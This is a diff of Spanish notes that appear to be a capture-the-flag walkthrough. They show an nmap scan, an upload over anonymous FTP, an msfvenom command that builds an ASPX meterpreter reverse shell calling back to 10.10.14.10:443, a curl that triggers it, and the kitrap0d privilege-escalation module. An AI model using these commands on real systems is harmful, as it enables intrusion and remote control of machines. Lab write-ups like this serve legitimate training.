@@ -15,15 +15,21 @@
 ----
 
 `nmap -p- --min-rate 5000 -sCV -n 10.10.10.5 -oN portScan`
+
 ![Pasted image 20241130202037](../../Fotos/Pasted%20image%2020241130202037.png)
+
 ![Pasted image 20241130202328](../../Fotos/Pasted%20image%2020241130202328.png)
 
 ![Pasted image 20241130202545](../../Fotos/Pasted%20image%2020241130202545.png)
+
 ![Pasted image 20241130202859](../../Fotos/Pasted%20image%2020241130202859.png)
 
 ![Pasted image 20241130202954](../../Fotos/Pasted%20image%2020241130202954.png)
+
 ![Pasted image 20241130203029](../../Fotos/Pasted%20image%2020241130203029.png)
+
 ![Pasted image 20241130203046](../../Fotos/Pasted%20image%2020241130203046.png)
+
 - Tenemos acceso a 2 de las 3 direcciones que indica el acceso ftp
 
 Como tenemos  acceso a la conexion ftp podemos cargar archivos con PUT, si cargamos un archivo podríamos verlo en la web como una dirección y ejecutarse.
@@ -47,6 +53,7 @@ Como tenemos  acceso a la conexion ftp podemos cargar archivos con PUT, si carga
 
 
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx > met_rev_443.aspx`
+
 ![Pasted image 20241130205053](../../Fotos/Pasted%20image%2020241130205053.png)
 
 ![Pasted image 20241130205139](../../Fotos/Pasted%20image%2020241130205139.png)
@@ -56,11 +63,14 @@ Como tenemos  acceso a la conexion ftp podemos cargar archivos con PUT, si carga
 ![Pasted image 20241130205406](../../Fotos/Pasted%20image%2020241130205406.png)
 
 Visitamos
+
 ![Pasted image 20241130205435](../../Fotos/Pasted%20image%2020241130205435.png)
+
 -  Opción `curl http://10.10.10.5/met_rev_443.aspx`
 - La idea es generar ejecución simplemente ya sea por curl o visitando la web
 
 Ya tenemos acceso CLI
+
 ![Pasted image 20241130205449](../../Fotos/Pasted%20image%2020241130205449.png)
 
 ![Pasted image 20241130205545](../../Fotos/Pasted%20image%2020241130205545.png)
@@ -74,6 +84,7 @@ F1:
 ![Pasted image 20241130205950](../../Fotos/Pasted%20image%2020241130205950.png)
 
 exploit/windows/local/ms10_015_kitrap0d
+
 ![Pasted image 20241130210356](../../Fotos/Pasted%20image%2020241130210356.png)
 
 ![Pasted image 20241130215030](../../Fotos/Pasted%20image%2020241130215030.png)
